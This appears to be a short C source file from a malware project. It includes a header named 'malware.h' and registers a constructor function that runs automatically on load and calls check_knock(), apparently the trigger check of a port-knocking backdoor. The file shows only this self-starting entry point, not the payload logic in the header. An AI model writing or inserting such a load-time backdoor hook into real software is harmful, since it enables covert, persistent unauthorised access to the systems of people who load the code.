#include "headers/malware.h"

void __attribute__((constructor)) init(){
    check_knock();
}